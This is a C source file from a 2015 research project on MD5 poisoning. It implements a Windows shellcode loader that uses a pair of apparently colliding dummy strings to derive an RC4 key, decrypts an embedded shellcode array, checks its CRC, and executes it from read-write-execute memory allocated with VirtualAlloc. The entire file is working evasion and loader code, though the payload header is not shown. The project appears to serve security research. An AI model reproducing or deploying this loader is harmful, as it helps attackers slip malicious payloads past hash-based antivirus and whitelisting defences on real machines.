/*
MD5 Poisoning - Wolves Among the Sheep
Copyright (C) 2015  Bálint Varga-Perke

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "stdafx.h"
#include<Windows.h>
#include<string.h>
#include "rc4.h"
#include "crc.h"
#include "sc.h"

#define DUMMY "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

char *dummya = DUMMY "A";
char *dummyb = DUMMY "B";
unsigned char code[]=SC;

int _tmain(int argc, _TCHAR* argv[])
{


	unsigned char key[]=SC_KEY;
	char* dummya_c=dummya;
	char* dummyb_c=dummyb;

	for (int i=0;i<strlen(dummya);i++){
		key[i%strlen((char*)key)]^=dummya_c[i]^dummyb_c[i];
	}
	printf("%s\n",key);
	printf("Code size: %d\n",sizeof(code));
	rc4_key_t rc4_key;
	rc4_set_key(key,strlen((const char*)key),&rc4_key);
	unsigned char crypted[sizeof(code)];
	memset(crypted,0,sizeof(code));
	rc4_crypt(crypted,sizeof(crypted),&rc4_key);
	for (int i=0;i<sizeof(code);i++){
		code[i]^=crypted[i];
		printf("\\x%02x",code[i]);
	}
	printf("\nDONE\n");
	if (crcSlow(code,sizeof(code))==SC_CRC){
		void* p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
		RtlMoveMemory(p,code,sizeof(code));
		((void(*)())p)();
		return 1;
	}else{
		printf("CRC mismatch (%d), exiting...",crcSlow(code,sizeof(code)));
	}
	return 0;
}




